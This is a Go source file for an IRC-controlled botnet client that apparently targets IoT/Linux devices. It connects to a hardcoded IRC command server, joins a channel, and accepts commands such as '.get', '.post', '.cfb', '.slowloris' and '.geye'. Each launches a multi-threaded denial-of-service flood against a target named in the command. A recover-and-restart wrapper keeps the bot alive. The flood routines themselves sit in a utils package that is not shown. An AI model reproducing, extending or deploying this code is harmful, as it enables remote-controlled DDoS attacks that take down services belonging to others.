package main

import (
	"bufio"
	"net"
	"net/textproto"
	"strconv"
	"os"
	"strings"
	"utils"
)

func NeverExit(f func()) {
	defer func() {
		if v := recover(); v != nil {
			go NeverExit(f)
		}
	}()
	f()
}

func notexit() {
	for {
		server := "1.1.1.1:6667"
	CONNS:
		connection, err := net.Dial("tcp", server)
		if err != nil {
			goto CONNS
		}
		connection.Write([]byte("NICK [iOT][IRC][" + utils.RandomString(5, false) + "]\r\n"))
		connection.Write([]byte("USER linux linux linux :The LinuxXD\r\n"))
		defer connection.Close()

		reader := bufio.NewReader(connection)
		tp := textproto.NewReader(reader)

		for {
			line, err := tp.ReadLine()
			if err != nil {
				goto CONNS
			}
			if strings.Contains(line, "PING") {
				pongresponse := "PONG :" + strings.Split(line, ":")[1] + "\r\n"
				connection.Write([]byte(pongresponse))
			}
			if strings.Contains(line, "001") {
				connection.Write([]byte("JOIN #test\r\n"))
			}
			if strings.Contains(line, ".stop") {
				utils.SetDDoSMode(false)
			}
			if strings.Contains(line, ".get") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("0", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, ".post") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("4", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, ".cfb") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("1", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, ".slowloris") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("2", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, ".geye") {
				threads, errt := strconv.Atoi(strings.Split(line, " ")[5])
				if errt != nil {
					continue
				}
				interval, erri := strconv.Atoi(strings.Split(line, " ")[6])
				if erri != nil {
					continue
				}
				utils.DDosAttc("3", strings.Split(line, " ")[4], threads, interval)
			}
			if strings.Contains(line, ".kill") {
				os.Exit(3)
			}
		}
	}
}

func main() {
	go NeverExit(notexit)
	select{}
}
